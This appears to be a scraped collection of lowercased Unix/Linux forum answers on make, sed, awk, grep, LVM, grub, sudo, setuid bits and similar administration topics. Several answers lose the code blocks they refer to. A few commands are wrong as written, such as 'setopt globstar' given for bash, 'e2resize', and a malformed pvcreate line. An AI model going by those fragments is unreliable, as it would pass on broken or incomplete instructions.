make(1) itself does not know how to run shell commands . it could have been made to do so , but the unix way is to have well-separated concerns : make(1) knows how to build dependency graphs that determine what has to be made , and sh(1) knows how to run commands . the point the author is trying to make there is that you must not write those command lines such that a later one depends on a former one , except through the filesystem . for example , this will not work : sometarget: some.x list.y of-dependencies.z foo=`run-some-command-here` run-some-other-command $$foo  if this were a two-line shell script , the first command 's output would be passed as an argument to the second command . but since each of these commands gets run in a separate sub-shell , the $foo variable 's value gets lost after the first sub-shell exists , so there is nothing to pass to the first . one way around this , as hinted above , is to use the filesystem : that stores the output of the first command in a persistent location so the second command can load the value up . another thing that trips make(1) newbies up sometimes is that constructs that are usually broken up into multiple lines for readability in a shell script have to be written on a single line or wrapped up into an external shell script when you do them in a Makefile . loops are a good example ; this does not work : someutilitytarget: for f in *.c do munch-on $f done  you have to use semicolons to get everything onto a single line instead : someutilitytarget: for f in *.c ; do munch-on $f ; done  for myself , whenever doing that gives me a command line longer than 80 characters or so , i move it into an external shell script so it is readable .
you have installed debian in a logical partition and in the msdos partition table you can not set logical partition as bootable you can resize the first partition ( /dev/sda1 ) and make a 1g ext3 or ext4 partition before that then run a live boot and : mount the new partition ( that is /dev/sda1 now ) under somewhere like /mnt # mount /dev/sda1 /mnt  then install grub2 bootloader by : grub-install --no-floppy --force --root-directory=/mnt 
with gnu diffutils package 's diff this will output only lines from file b which either were modified or newly inserted : diff --unchanged-line-format= --old-line-format= --new-line-format='%L' a b 
i do not see any 11gb partitions in your gpart output . /root is a home directory for user " root " and usually located on / partition . why do you need 15gb on /root ? on freebsd /home is usually symlinked to /usr/home ( unless there is separate /home partition ) and uses all available disk space left after / and /var .
a restart job has to kill an old instance first . what is happening here is that there is not an old copy to kill . i advise you to try this command instead :  /etc/init.d/vsftpd restart 
if you really mean " forget the password " it probably already did within microseconds of you entering it . persistence of authentication through the login session is maintained in ubuntu-ish systems by ssh-agent and gnome-keyring-daemon . by their nature of operation ( non-invertable hashing ) it may be fundamentally impossible to selectively remove one authentication . as you note , logging out destroys the cached authentication , ssh_agent -k would kill the cache without logging out ( but other things would fail to authenticate too ) . this looks like you can have single-sign-on ease or fine-grained authentication control , pick one .
tail works with binary data just as well as with text . if you want to start at the very beginning of the file , you can use tail -c +1 -f .
iirc , pure posix make does not allow that . you will need to resort to some kind of extension provided by the precise version of make you are using . for example with gnu make com=$ ( wildcard $ ( text ) * ) or nearer to what you are asking , but launch an additional shell com=$ ( shell ls $ ( text ) * )
sounds like the device is remote . assuming linux . . . ssh remote_host 'dd if=/dev/sdb1' | cp --sparse=always /proc/self/fd/0 new-sparse-file  if local . . . dd if=/dev/sdb1 | cp --sparse=always /proc/self/fd/0 new-sparse-file  this gives you an image that is mountable . however , if you pulled it across the network then you had 1.2 tb of network traffic ( usually a bottleneck ) and the cpu load of ssh and sshd . if you are pulling that much across a network and network traffic costs you money . . . ssh remote_host 'dd if=/dev/sdb1 | gzip ' | gunzip | cp --sparse=always /proc/self/fd/0 new-sparse-file 
async is the opposite of sync , which is rarely used . async is the default , you do not need to specify that explicitely . the option sync means that all changes to the according filesystem are immediately flushed to disk ; the respective write operations are being waited for . for mechanical drives that means a huge slow down since the system has to move the disk heads to the right position ; with sync the userland process has to wait for the operation to complete . in contrast , with async the system buffers the write operation and optimizes the actual writes ; meanwhile , instead of being blocked the process in userland continues to run . ( if something goes wrong , then close ( ) returns -1 with errno = eio . ) ssd : i do not know how fast the ssd memory is compared to ram memory , but certainly it is not faster , so sync is likely to give a performance penalty , although not as bad as with mechanical disk drives . as of the lifetime , the wisdom is still valid , since writing to a ssd a lot " wears " it off . the worst scenario would be a process that makes a lot of changes to the same place ; with sync each of them hits the ssd , while with async ( the default ) the ssd will not see most of them due to the kernel buffering . in the end of the day , do not bother with sync , it is most likely that you are fine with async .
remove the existing LOG rule and replace it with a rule to only log packets matching --dport 22 . that will match the same packets that will be rejected by the REJECT rule iptables -D INPUT 1 # Deletes rule 1 on INPUT chain iptables -I INPUT 1 -p tcp -s 192.168.1.134 --dport 22 -j LOG 
here 's one way to do it . i just put your output into a file called sample . txt to make it easier to test , you can just append my commands to the end of your echo command : sample . txt Folder="FOLDER1M\1" File="R1.txt" Folder="FOLDER1M\2" File="R2.txt" Folder="FOLDER2M\3" File="R3.txt"  command % cat sample.txt | sed 'h;s/.*//;G;N;s/\\n//g' | sed 's/Folder=\|"//g' | sed 's/File=/\\/' | sed 's/^/www.xyz.com\\/'  breakdown of the command join every 2 lines together # sed 'h;s/.*//;G;N;s/\\n//g' Folder="FOLDER1M\1"File="R1.txt" Folder="FOLDER1M\2"File="R2.txt" Folder="FOLDER2M\3"File="R3.txt"  strip out folder= and " # sed 's/Folder=\|"//g' FOLDER1M\1File=R1.txt FOLDER1M\2File=R2.txt FOLDER2M\3File=R3.txt  replace file= with a '\' # sed 's/File=/\\/' FOLDER1M\1\R1.txt FOLDER1M\2\R2.txt FOLDER2M\3\R3.txt  insert www.xyz.com # sed 's/^/www.xyz.com\\/' www.xyz.com\FOLDER1M\1\R1.txt www.xyz.com\FOLDER1M\2\R2.txt www.xyz.com\FOLDER2M\3\R3.txt  edit #1 the op updated his question asking how to modify my answer to delete the first line of output , for example : / &gt; cat /TagA/TagB/File/@*[name()="Folder" or name()="File"] ... ...  i mentioned to him that you can use grep -v ... to filter out lines that are not relevant like so : % cat sample.txt | grep -v "/ &gt;" | sed 'h;s/.*//;G;N;s/\\n//g' | sed 's/Folder=\|"//g' | sed 's/File=/\\/' | sed 's/^/www.xyz.com\\/'  additionally to write the entire bit out to a file , that can be done like so :
vim sometimes has trouble with files that have unusually long lines . it is a text editor , so it is designed for text files , with line lengths that are usually at most a few hundred characters wide . a database file may not contain many newline characters , so it could conceivably be one single 100 mb long line . vim will not be happy with that , and although it will probably work , it might take quite a long time to load the file . i have certainly opened text files much larger than 100 mb with vim . the file does not even need to fit in memory all at once ( since vim can swap changes to disk as needed ) .
since you do not explicitly mention which desktop environment he is using ( i assume he uses some desktop environment , not plain window manager ) , i assume that he uses cinnamon , which is the default on linux mint . to display applet on cinnamon 's taskbar , you can just do the following : right-click the panel and choose " add applets to this panel " . find there an applet called " power manager " . if the applet ( power manager in your case ) is not active , right-click it and choose " add to panel " . if the power manager does not still show up , check that you have panel launcher -applet enabled . it can be checked/enabled from cinnamon settings -> applets . references linux mint forums : power management applet linux mint forums : add programs to taskbar
you can " anchor " the beginning of the filename by including a slash in the regex pattern : find /foo/bar/ -regex '.*/baz\d'  this will ensure that you only get files like baz1 , and not bazbaz1 .
i often find myself unable to successfully compile a program , so i end up using apt-get to install it . do not do that . you have it backward . you should first check if you can install via apt-get , then if you can not , compile from source . it is good that you know how to use configure/make , etc . , but doing so over and over again unnecessarily is not going to provide much opportunity for learning anything more , and it is not going to benefit your system much either . there are more productive uses for your time wrt learning about linux . i want to learn how programs really work , what really happens when i compile a program . that is a pretty hefty regress . i am not saying that to belittle you -- i have the same " why ? then why ? then why ? " predilection , and i think linux is very appealing to people like this . but , to be honest , i do not think there is an answer to this question that is of much value or meaning to people who can not read or write code . it seems to me you might very well be interested in programming and i would encourage you to pursue that interest first , and worry about how compilers work later . if you are not interested in programming , then do not worry about how compilers work . i want to learn where to find configuration files and how to edit them . you find them by consulting the documentation for the software you want to configure . there is no hard and fast standard , though obviously there is lots of stuff in /etc and " hidden " dot directories in $home . as for how to edit them , if you mean " what are the rules " , linux uses the shell a lot to accomplish system level things , but the configuration for individual applications is usually of a form unique to the application , so again , you have to read the specific documentation . i want to know more about environment variables as well . that is a question that can be well addressed within the scope of a wikipedia article . wikipedia is a great resource for computing questions and the standard there tends to be much higher than it is on the web at large . i want to learn how mime-types work . this is similar to the question about environment variables in so far as some casual reading of wikipedia should do it , but also sort of like the compiler question in so far as i do not think it is going to be very useful or meaningful to you , currently . i think installing arch linux would be a good thing from what i know of arch , i think it is potentially a good learning experience . same with gentoo . far ahead of both of them in this regard would be linux from scratch . however , i think what i would recommend over any of that ( distro hopping ) is , again , programming . if linux is where you are at , either c ( which is the native base -- bluntly , all rivers lead to the c eventually , lol ) and/or one of perl , python , or ruby . currently , python seems to be winning popularity contests , but those three are in fact all more-or-less equivalent , so whichever strikes your fancy . ruby is probably the most generic in form and aimed more at new users than the other two , meaning it is a good first language . perl has a lot going for it and has been fundamental on linux since forever . i do not recommend learning via bash or shell programming . you do inevitably need to have a grasp on the shell , but programming wise it lacks a lot of important features and is much more esoteric and fussy ( and much less generally useful ) than any of perl/python/ruby . if you live near a city or decent size town , the library system probably has books on introductory programming in c , perl , python and ruby . that is my #1 recommendation , ahead of installing arch or trying to understand apt in depth : get yourself a book and start programming .
wakoopa ( http://social.wakoopa.com ) and rescuetime ( http://www.rescuetime.com ) seems to do what you want . they both require a client to run in the background to track the software you use . not sure about rescuetime , but wakoopa stops tracking software after 30 seconds without input from mouse or keyboard .
first of all you should be aware of slapcat 's limitations : so you better pack that backup in /etc/init.d/ldap stop and /etc/init.d/ldap start as well . before restarting ldap in the restore procedure , you can dump the just loaded data to a temporary file and compare that to the ldif file you just used as input . i am pretty sure the ldif output for slapcat is sorted by distinguished names so a diff should exit with exit-code 0 . this of course assumes that slapcat is working correctly . if you do not trust that you should extract all data relevant to you , from the running db with ldap_search_ext() , generate some output ( dump or checksum ) from that , and compare that with running the same code on the restored database ( after starting ldap of course ) . that way you would notice if some data relevant to your usage is left out of the dump by slapcat ( unlikely , but possible if it has a bug )
see this related stack overflow answer - stackexchange-url it looks like the best option would be making an alias , so you could type git s to get the short listing instead of git status --short and then just use git status for the --verbose listing . git config --global alias.s 'status --short' 
that is not a multi-line comment . # is a single line comment . : ( colon ) is not a comment at all , but rather a shell built-in command that is basically a nop , a null operation that does nothing except return true , like true ( and thus setting $? to 0 as a side effect ) . however since it is a command , it can accept arguments , and since it ignores its arguments , in most cases it superficially acts like a comment . the main problem with this kludge is the arguments are still expanded , leading to a host of unintended consequences . the arguments are still affected by syntax errors , redirections are still performed so : &gt; file will truncate file , and : $(dangerous command) substitutions will still run . the least surprising completely safe way to insert comments in shell scripts is with # . stick to that even for multi-line comments . never attempt to ( ab ) use : for comments . there is no dedicated multi-line comment mechanism in shell that is analogous to the slash-star /* */ form in C-like languages . for the sake of completeness , but not because it is recommended practice , i will mention that it is possible to use here-documents to do multi-line " comments":
you can use awk . put the following in a script , script.awk: now run it like this : the script works as follows . this block creates 3 arrays , f1 , f1_c14 , and f1_c5 . f1 contains all the lines of file1 in an array , indexed using the contents of the columns 1 , 2 , and 4 from file1 . f1_c14 is another array with the same index ( 1 , 2 , and 4 's contents ) and a value of 1 . the 3rd array uses the same index as the 1st 2 , with the value of the 5th column from file1 . FNR == NR { f1[$1,$2,$4] = $0 f1_c14[$1,$2,$4] = 1 f1_c5[$1,$2,$4] = $5 next }  the next block is responsible for printing lines from the 1st file , file1 under the conditions that the columns 1 , 2 , and 4 match the columns from file2 , and it will onlu print the line from file1 if the 5th columns of file1 and file2 do not match . f1_c14[$1,$2,$4] { if ($5 != f1_c5[$1,$2,$4]) print f1[$1,$2,$4]; }  the 3rd block is responsible for printing the associated line from file2 there is a corresponding line in the array f1 for file2 's columns 1 , 2 , and 4 . again it only prints if the 5th columns do not match . f1[$1,$2,$4] { if ($5 != f1_c5[$1,$2,$4]) print $0; }  example running the above script like so : you can use the column command to clean up the output slightly : how it works ? fnr == nr this makes use of awk 's ability to loop through files in a particular way . here 's we are looping through the files and when we are on a line that is from the first file , file , we want to run a particular block of code on this line from file1 . this example shows what FNR == NR is doing when we give it 2 simulated files . one has 4 lines in it while the other has 5 lines : other blocks the other blocks , f1_c14[$1,$2,$4] and f1[$1,$2,$4] only run when the values from those array elements has a value .
grep -Fxf list -v /etc/remotedomains &gt; remotedomains.new mv remotedomains.new /etc/remotedomains  the -v tells grep to only output lines that do not match the pattern . the -f list tells grep to read the patterns from the file list . the -F tells grep to interpret the patterns as plain strings , not regular expressions ( so you will not run into trouble with regex meta-characters ) . the -x tells grep to match the whole line , e.g. if there is a pattern foo that should only remove the line foo , not the line foobar or barfoo .
one way is to use cut:  command | cut -c1-8  this will give you the first 8 characters of each line of output . since cut is part of posix , it is likely to be on most unices .
you are looking for x11vnc : x11vnc allows one to view remotely and interact with real x displays ( i.e. . a display corresponding to a physical monitor , keyboard , and mouse ) with any vnc viewer . in this way it plays the role for unix/x11 that winvnc plays for windows .
damn small linux is old ( kernel 2.4 ) . you should choose another distribution . take a look at this question .
on systems with the SEEK_HOLE lseek flag ( like your ubuntu 12.04 ) would ( and assuming the value for SEEK_HOLE is 4 as it is on linux ) : that shell syntax is posix . the non-portable stuff in it are perl and that SEEK_HOLE . if you want to list the sparse files : find . -type f ! -size 0 -exec perl -le 'for(@ARGV){open(A,"&lt;",$_)or next;seek A,0,4;$p=tell A;seek A,0,2;print if$p!=tell A;close A}' {} +  the gnu find has -printf %S to report the sparseness of a file . it takes the same approach as frostschutz ' answer in that it takes the ratio of disk usage vs file size , so is not guaranteed to report all sparse files , but would work on systems that do not have SEEK_HOLE or file systems where SEEK_HOLE is not implemented . here with gnu tools : find . -type f ! -size 0 -printf '%S:%p\0' | sed -zn 's/^0[^:]*://p' | tr '\0' '\\n' 
this can happen if the application is writing directly to the tty instead of stdout or stderr . you can play with this behavior by comparing the 2 examples below ( echo foo ) &amp;&gt;/dev/null ( echo foo &gt; $(tty) ) &amp;&gt;/dev/null  notice the first does not show anything , but the second does . that is because we sent the output directly to the tty and bypassed the redirection to /dev/null . you can get around stuff like this by using script script -c '( echo foo &gt; $(tty) ) &amp;&gt;/dev/null' &gt;/dev/null  basically the script utility creates a fake tty and launches the command in that tty . any output from the command is sent to stdout which you can then redirect as normal .
the file was moved to the actual parent directory of the one you were in , rather than the parent directory of the symlink you followed to get there . by default cd behaves differently than ls or mv when encountering .. . cd just goes up the path , effectively reverse-following symlinks , whereas the others go to the actual parent of the directory they are in , regardless of how you got there . imagine a directory tree like this ( ~ is the home directory and shortcut is a symlink to maindir/subdir ) : ~ \u251c\u2500\u2500 maindir/ \u2502 \u2514\u2500\u2500 subdir/ \u2502 \u2514\u2500\u2500 file.txt \u2514\u2500\u2500 shortcut -&gt; maindir/subdir/  if you simply cd to ~/shortcut then ls will show file.txt , and pwd will show ~/shortcut . however , while the output of pwd is correct according to the symlink you followed to get there , you are actually ( "physically " , if you will ) in ~/maindir/subdir . ls and mv are aware of this , so mv file.txt .. will move file.txt to the actual parent directory : ~/maindir , rather than ~ as you expected . you can get cd to behave like the others by using the -P switch . so if you are in the directory you originally ran the mv command from ( ~/shortcut ) and run cd -P .. , it will take you to the actual parent directory ( e . g . ~/maindir ) , and you will be able to find file.txt there with a simple ls file.txt . ( you can also get to the actual current directory with cd -P . . )
as far as i know , xen does not have a seamless mode . you did not mention which guest you want to run seamlessly , but if it is windows , you might be able to get a similar functionality ( non-local apps appearing to run locally ) by using windows terminal services and rdp . see http://www.rdesktop.org/ and http://www.cendio.com/seamlessrdp/ if you want to run some other guest , then i believe you have fewer options ( none that i am aware of ) .
if your shell is bash ≥4 , put setopt globstar in your ~/.bashrc . if your shell is zsh , you are good . then you can run grep -n GetTypes **/*.cs  **/*.cs means all the files matching *.cs in the current directory , or in its subdirectories , recursively . if you are not running a shell that supports ** but your grep supports --include , you can do a recursive grep and tell grep to only consider files matching certain patterns . note the quotes around the file name pattern : it is interpreted by grep , not by the shell . grep -rn --include='*.cs' GetTypes .  with only portable tools ( some systems do not have grep -r at all ) , use find for the directory traversal part , and grep for the text search part . find . -name '*.cs' -exec grep -n GetTypes {} + 
you can not change what stdin of telnet is bound to after you start , but you can replace the simple echo with something that will perform more than one action - and let the second action be " copy user input to the target": { echo "hello"; cat; } | telnet somewhere 123  you can , naturally , replace cat with anything that will copy from the user and send to telnet . keep in mind that this will still be different to just typing into the process . you have attached a pipe to stdin , rather than a tty/pty , so telnet will , for example , be unable to hide a password you type in .
probably easiest method : cat some_file | grep '?' | cut -d'-' -f1 cat somefile => feed the contents of some_file into the pipe grep '?' => filter only lines containing a ? cut -d'-' -f1 => divide the string into fields with - as field separator , then print field #1
one way you could do this is booting from the dvd of the slackware iso . then , when at the root prompt , you should mount the root partition of the hard drive , like this ( used sdb1 in the example ) now , edit /etc/fstab and change mount points according , knowing that probably your disk was labeled sda before and now it will be named sdb . if you are using the default boot loader , lilo , edit /etc/lilo.conf and in the boot section change both the line boot = /dev/sda to boot = /dev/sdb and the root line in image = /boot/vmlinuz root = /dev/sdb1 &lt;-- change here to sdb1 label = Slackware64 vga = 773 initrd = /boot/initrd.gz read-only  now run /sbin/lilo so that it can install lilo again with the new definition . one last thing you should check is whether you are using initrd or not . if you made no modifications to the boot procedure , probably you are not using it , so the above procedure is sufficient . if you are using initrd , take a look at /usr/share/mkinitrd/mkinitrd_command_generator.sh to build a new initrd .
curl can display the file the same way cat would . no need to delete the file since it simply displayed the output unless you tell it to do otherwise . curl -u username:password sftp://hostname/path/to/file.txt  if you use public key authentication : curl -u username: --key ~/.ssh/id_rsa --pubkey sftp://hostname/path/to/file.txt  if you use the default locations , then --key and --pubkey can be omitted : curl -u username: sftp://hostname/path/to/file.txt  the user name can also be a part of the url , so the final result looks very close to the ssh command : curl sftp://username@hostname/path/to/file.txt 
there is no issue with the \\n . this is yet again the old escape sequence length problem : \e[0m and similar do not contribute to the actual length of the prompt , so you have to enclose them in \[ . . \] to indicate this to the interpreter : PS1="\[\e[0;36m\]\h\[\e[m\] \[\e[0;33m\]\w/\[\e[m\]\\n \[\e[0;31m\]\$ \u2192\[\e[m\] " 
on debian and other systems that use pam ( which is most of them nowadays ) , you can set environment variables ( including PATH ) in /etc/environment . this will work for any login method that uses the pam_env module ( either in the auth section or in the session section ) ; on debian that should be all of them ( at least the ones that provide ways to log in and run commands ) .
find . -name TheFileName -type f -exec sh -c 'for i do echo SomeText &gt; "$i"; done' sh {} + 
just a tip : try to locate libXfont.so.1 or libXfont.so . if it is located make a symlink to it : ln -s `locate libXfont.so.1 | line` /usr/lib/x86_64-linux-gnu/  as mikeserv suggested below , quick and dirty fix is to find libXfont.so.N and make symlink libXfont.so.1 &gt;&gt; libXfont.so.N . you can also check if X requires some other shared libraries by issuing ldd /usr/bin/X . to summarize chat discussion : issue was fixed by : sudo apt-get remove --purge libxfont1 sudo apt-get install libxfont1 xorg sudo rm ~/.Xauthority reboot 
keep only /boot in the first partition first , 243mb is enough for /boot . if it is the root partition that you have on /dev/sda1 , then there is not enough room even for a basic installation . if you have separated /usr , do not : this was useful in the days of read-only or shared /usr but is not nowadays . to move the root partition : move all the files to the existing partition on the logical volume . move /boot back to /dev/sda1 . update your bootloader configuration . for example , if your bootloader is grub , run update-grub . also update your initrd or initramfs if you have one . the details depend on your distribution . how to enlarge the first partition given that you have plenty of free space , the easiest solution is to make use of it and move your existing data there . create a new logical partition sda6 in the free space with gparted . create a physical volume in the new partition and add it to the existing volume group . i will call the volume group mygroup . pvcreate /dev/sda6 vgextend mygroup /dev/sda6  move the existing logical volume ( s ) to the new physical volume . pvmove /dev/sda5  decommission the now-unused physical volume . vgreduce mygroup /dev/sda5 pvremove /dev/sda5  in gparted , resize and move /dev/sda5 to make room for a larger /dev/sda1 , and enlarge /dev/sda1 . create a physical volume on /dev/sda5 and add it to the volume group . pvcreate /dev/sda5 vgextend mygroup /dev/sda5  use the free space on the volume group as you see fit . extend the filesystem on /dev/sda1 . resize2fs /dev/sda1 
you can always do : sudo env "PATH=$PATH" godi_console  as a security measure on debian , /etc/sudoers has the secure_path option set to a safe value .
you can use lvm for this . it was designed to separate physical drive from logical drive . with lvm , you can : add a fresh new physical drive to a pool ( named volume group in lvm terminology ) pvcreate /dev/sdb my_vg extend space of a logical volume lvextend . . . and finish with an online resize of your filesystem e2resize /mnt/my/path but beware it is not a magic bullet . it is far more harder to reduce a filesystem , even with lvm .
use the option -c to output the result to stdout . gziping all files in .cache: for i in .cache/*; do gzip -c "$i" &gt; "$i.gz"; done  edit : to gzip them again and not gzip the gziped files check the suffix : for i in .cache/*; do [ "${i:(-3)}" == ".gz" ] || gzip -c "$i" &gt; "$i.gz"; done  so only files that not end in .gz will be gziped .
source code is going to be your best bet . you can in a pinch use the command strings to get some basic ideas about a binary and text that it may contain . example here are the first 20 lines of the output . these are the lines that contain the string " error " in them .
you can have multiple tests in a single grep command by passing each expression with a -e argument instead of as the first non-option argument as you normally see : $ grep -v -e foo -e bar file  that says the same thing your command does : print lines from file that contain neither " foo " nor " bar " . keep in mind that removing -v completely inverts this ; it changes the logical operation , too ! you get all lines that contain " foo " or " bar " .
the configuration file /etc/resolv.conf contains information that allows a computer connected to a network to resolve names into addresses . change it to : nameserver 8.8.8.8 nameserver 8.8.4.4  also check that your dhclient is activated . http://www.malgouyres.fr/linux/configreseau_en.html#resolv
you would do this via xmodmap and not via your window manager . this is directly related to your keyboard layout/keymap and not your window manager . to change your xmodmap create a file named ~/.Xmodmap and add the following content . this should allow you to to type üäöß directly with altgr+u keysym a = a A adiaeresis Adiaeresis keysym o = o O odiaeresis Odiaeresis keysym u = u U udiaeresis Udiaeresis keysym s = s S ssharp section  afterwards you have to apply the content from this file with xmodmap ~/.Xmodmap another way to input umlauts is to use the us international layout . this allows you to enter umlauts with " + char . to enter ä you would need to enter "a . the international layout is also available in windows and as far as i know in osx . setxkbmap -layout us -variant intl 
no , mount does not " detect " any directories under a filesystem . it is not its purpose . if you put /var , /opt and /usr all on a one partition , which is not the root partition of your system , you will need to do two things : mount the partition under some separate , special directory - let 's say /mnt/sysdirs bind-mount the directories at their proper places in the root filesystem . so the fstab in your case should look something like this :
it looks like this is simply a restriction imposed by the google dns servers . they apparently limit their responses to 72 bytes , regardless of the size of the packet that was sent . it may be a way to prevent their servers from being used in some kind of dos attack , or to prevent them from overloading their uplinks with large ping responses . see ken felix security blog . he writes : take google for example , there ipv4 dns servers which are probably ping every second by god only knows who . they have deployed icmp ( echo-reply ) rate controls because of this . [ example elided ] so my 200byte echo-request , only returned backed 72 bytes . they have to do this or if not , they would see even more icmp traffic outbound , and this would conflict with the whole object of the delivery of the dns response or other business critical services .
you could ignore the builtin history mechanism and abuse $prompt_command to write history any way you wanted . some people keep a directory of history files , one for each shell/date/hostname , etc . approx something like this : prompt_cmd() { echo "$_" &gt;&gt; $HOME/.my_history_file_$HOSTNAME } PROMPT_COMMAND=prompt_cmd  obviously embellish with dates , times , whatever . . .
well i have fixed this for myself , though i am unsure of the exact cause still . i have pandora one installed on my machine , and i noticed last week that it was running at startup/login . i generally dislike having applications run at startup unless they are actually necessary for general functionality , so i took it out of my startup lists . since then , this problem has stopped occurring . my guess is that either pandora or adobe air as a whole was grabbing my sound card at startup and locking it full on , then not resetting the levels/releasing it after exiting . why it would be doing this , i have no idea , but that is the best i can come up with at this point . i did install pandora before i went from f13 to f14 , so that would explain why the problem persisted across versions/installs . this is just a guess , though , so if anyone can provide a legitimate explanation then i am all ears .
you want command substitution , not redirection : cd "$(locate Descargas | grep -F 'Descargas$')"  the bits between the $ and the  are run as a command and the output ( stripped of any final newline ) is substituted into the overall command . this can also be done with ‘back ticks’ ( “`” ) : cd "`locate Descargas | grep -F 'Descargas$'`"  the dollar-paren syntax is generally preferred because it is easier to deal with in nested situations : # contrived cd "$(grep '^dir: ' "$(locate interesting-places | head -1)" | sed 's/^[^ ]*//')" 
there are numerous options for programs or even file systems that handle synchronization . i still use the ridiculously old unison program to keep some of my home directories in sync . there are other programs similar to this as well . for easier situations that only require one way coping , rsync does the job nicely . for cross platform synchronization , the ever popular dropbox is always an options , although i would also look into more open alternatives such as cloudfs . another thing you really ought to consider is version control . at first it might not seem that it is suitable , but if you really analyze your synchronization problem , you might find that version control is just the ticket . this gives you far more freedom to change things in multiple places without breaking the synchronization ( two way sync is always a challenge ) . the ability to track and merge different sets of changes can be invaluable . you might consider a distributed system like git or a central one like subversion depending on your application , although in all likelihood if you can get your head around the distributed model it will prove better in the long run .
every process in a unix-like system , just like every file , has an owner ( the user , either real or a system " pseudo-user " , such as daemon , bin , man , etc ) and a group owner . the group owner for a user 's files is typically that user 's primary group , and in a similar fashion , any processes you start are typically owned by your user id and by your primary group id . sometimes , though , it is necessary to have elevated privileges to run certain commands , but it is not desirable to give full administrative rights . for example , the passwd command needs access to the system 's shadow password file , so that it can update your password . obviously , you do not want to give every user root privileges , just so they can reset their password - that would undoubtedly lead to chaos ! instead , there needs to be another way to temporarily grant elevated privileges to users to perform certain tasks . that is what the setuid and setgid bits are for . it is a way to tell the kernel to temporarily raise the user 's privileges , for the duration of the marked command 's execution . a setuid binary will be executed with the privileges of the owner of the executable file ( usually root ) , and a setgid binary will be executed with the group privileges of the group owner of the executable file . in the case of the passwd command , which belongs to root and is setuid , it allows normal users to directly affect the contents of the password file , in a controlled and predictable manner , by executing with root privileges . there are numerous other SETUID commands on unix-like systems ( chsh , screen , ping , su , etc ) , all of which require elevated privileges to operate correctly . there are also a few SETGID programs , where the kernel temporarily changes the gid of the process , to allow access to logfiles , etc . sendmail is such a utility . the sticky bit serves a slightly different purpose . its most common use is to ensure that only the user account that created a file may delete it . think about the /tmp directory . it has very liberal permissions , which allow anyone to create files there . this is good , and allows users ' processes to create temporary files ( screen , ssh , etc , keep state information in /tmp ) . to protect a user 's temp files , /tmp has the sticky bit set , so that only i can delete my files , and only you can delete yours . of course , root can do anything , but we have to hope that the sysadmin is not deranged ! for normal files ( that is , for non-executable files ) , there is little point in setting the setuid/setgid bits . setgid on directories on some systems controls the default group owner for new files created in that directory .
gcc on gcc ( man gcc ) the checks are enabled by you can disable both by prepending no- to the option name -fno-stack-protector -fno-stack-protector-all  llvm/clang on llvm/clang ( http://clang.llvm.org/docs/usersmanual.html#commandline ) to enable/disable adresssanitizer : -f [ no- ] address-sanitizer : turn on addresssanitizer , a memory error detector . and safecode ( http://safecode.cs.illinois.edu/docs/usersguide.html ) -f [ no- ] memsafety
it is now extremely easy to install stackapplet on debian thanks to a fallback module for appindicators that i wrote , which ships with stackapplet . you can install it by downloading the source package for the latest version from its launchpad page . from there , you simply need to extract the contents of the archive and run : sudo python setup.py install  . . . which will take care of installation .
or there is some more correct way ? i do not know if it would be considered more correct , since i think it is an rsyslog specific feature ( and it might be considered " more correct " to do things in a syslog compatible way whenever possible . . . or it might not ) but there is the ampersand : syslog.* /var/log/syslog.log &amp; :ommysql:localhost,database,user,password  it is documented here , if you search the page for " ampersand " . i believe " legacy description " there refers to not to " syslog compatible " behaviour but to the legacy behavior of rsyslog , which now implements something called rainerscript for writing rules . as to whether that is really easier or more correct in this case i can not say .
both perl and python ( and probably ruby as well ) have simple kits that you can use to quickly build simple http proxies . in perl , use http::proxy . here 's the 3-line example from the documentation . add filters to filter , log or rewrite requests or responses ; see the documentation for examples . use HTTP::Proxy; my $proxy = HTTP::Proxy-&gt;new( port =&gt; 3128 ); $proxy-&gt;start;  in python , use simplehttpserver . here 's some sample code lightly adapted from effbot . adapt the do_GET method ( or others ) to filter , log or rewrite requests or responses .
ok , after some search i found this : http://freecode.com/projects/mrouted i downloaded the latest source code ( 2011 ) and it compiled flawlessly on 64-bit cpu . thank you all anyway !
it is not possible without patching mutt , however you could limit to : ~d &lt;1d ~h '^Date:.*(1[3-9]|2.):..:'  to list the emails that have been sent today after 13:00 ( in their own timezone ) . to check the date in your timezone , you may be able to rely on the fact that there should be a Received header added by a mta in your timezone ( especially if it goes through a mta on your machine ) . then you could do : ~r &lt;1d ~h '^Received:.*(1[3-9]|2.):..:.. \+0100'  ( +0100 is the time zone offset where i live ( +0000 in winter ) , it may be different for you ) . you can also do the selection manually : sort by sent or received date note the first ( x ) and last ( y ) message you wish to see . limit using ~m x-y
per : nfs version 3 and 4 with tcp/ip protocols , you could enter either of these commands : rpcinfo -p &lt;hostname&gt; |grep nfs rpcinfo -s &lt;hostname&gt; |grep nfs  note : all flavours of the command appear to support the -p argument , while the solaris and gnu linux variants also support the -s variant . you could include some logic , based around the enquiry , into a shell script that instantiates a variable that could be pluged into a mount command e.g.
well , for a start , php is not doing shell_exec through bash in your case , it is doing it through sh . this is fairly obvious from the exact error message . i am guessing that this is controlled by whatever shell is specified in /etc/passwd for the user that the web server is running as and shell_exec does not capture stderr , in combination with that when you run php from the command line it simply drops out to ${shell} . when launched as sh , bash turns off a number of features to better mimic the behavior of the original sh shell . sourcing of .bashrc and .bash_profile almost certainly are among those , if for no other reason then because those files are likely to use bash-specific syntax or extensions . i am not really sure about the ssh case , but judging from the plain $ prompt , you might very well be running through sh there , which would likewise explain the behavior you are seeing . try echo ${SHELL} to see what you really got dropped into ; that should work on all shells . that said , it seems to me like a really bad idea to depend on bash aliases from a php script . if what you want to do is too long to fit nicely in the shell_exec statement itself ( which should only be used with great care ) , making a php function to create the command line from the parameters and calling that is almost certainly a much better approach , and it will work essentially regardless of which shell is installed , selected or how it is configured . alternatively , consider calling an external script file , which can be written in bash and specify /bin/bash as its interpreter . but then your application will require that bash is installed ( which it probably does already if it depends on bash aliases . . . ) .
bash has a precommand hook . sort of .
awk 'BEGIN{ORS=","}1' input.txt  yields this : EN1,EN2,EN3,EN4,EN5,  so is printing with a comma ( so i am not sure i understand your comment in your post about this not happening ) though i suspect the trailing comma is a problem . tested with gnu awk 3.1.7
this fixed it ! only difference is that the installation told me to use apt-get install firmware-b43-lpphy-installer instead .
you need to export ld_library_path , not just assign it .
not sure what your attempted solution has to do with the problem you state ; if your problem description is accurate the following should work awk 'NR==1,/Caroline, No/{print;next};c++&lt;5{print};' file 
